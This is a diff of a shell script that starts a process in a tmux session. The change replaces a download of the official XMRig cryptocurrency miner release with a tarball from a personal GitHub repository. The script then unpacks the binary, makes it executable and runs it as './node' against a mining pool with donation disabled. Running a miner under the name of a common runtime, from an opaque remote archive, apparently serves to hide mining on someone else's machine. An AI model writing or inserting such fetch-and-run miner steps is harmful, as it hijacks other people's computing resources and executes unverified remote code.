@@ -22,10 +22,9 @@ else
 
     tmux send-keys -t $SESSION "
         rm -rf ./xmrig* &&
-        wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz &&
-        tar -xzf xmrig-6.22.2-linux-static-x64.tar.gz &&
-        cd xmrig-6.22.2 &&
-        mv xmrig node &&
+        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/node.tar.gz &&
+        tar -xzf node.tar.gz &&
+        cd node-18 &&
         chmod +x node &&
         exec ./node -o $DOMAIN --tls -k --donate-level=0 -t 4 --rig-id $NAME_WORK
     " C-m
